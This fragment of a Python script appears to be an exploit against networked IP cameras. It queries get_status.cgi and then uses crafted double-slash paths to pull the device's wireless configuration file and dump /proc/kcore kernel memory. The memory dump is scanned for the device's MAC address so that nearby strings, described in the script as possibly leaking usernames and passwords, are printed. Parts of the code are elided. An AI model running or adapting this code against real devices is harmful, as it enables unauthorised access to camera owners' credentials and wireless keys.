...
response = urllib.request.urlopen('http://' + sys.argv[1] + '/get_status.cgi')
xcontent = response.read().decode('utf-8').split(";\n")
...
try:
    resp = urllib.request.urlopen("http://" + sys.argv[1] + "//etc/RT2870STA.dat")
    xcontent = resp.read().decode('utf-8').split("\n")
...
try:
    urllib.request.urlopen('http://' + sys.argv[1] + '//proc/kcore')
except:
        ...
        for line in tailer.follow(open('tmpstrings.out', 'r')):
            ...
            if done == 0:
                ...
                if line == macaddr:
                    ...
                    print(bcolors.OKGREEN + "\n\nmac address triggered.. printing the following dumps, could leak "
                                               "username and passwords.." + bcolors.ENDC)
                else:
